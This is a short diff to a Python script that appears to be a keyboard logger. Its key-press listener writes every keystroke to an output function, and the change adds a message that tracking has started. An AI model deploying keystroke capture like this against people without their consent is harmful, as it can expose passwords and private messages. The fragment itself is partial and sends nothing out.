@@ -50,7 +50,8 @@ def on_press(key):
 	elif "\\" in str(key):
 		write(str("\\"))
 	else:
-		write(to_lower_case(str(key).replace("'","")))
+		write(to_lower_case(str(key).replace("'", "")))
+print("started tracking the keyboard")
 with Listener(
     on_press=on_press) as Listener:
     Listener.join()
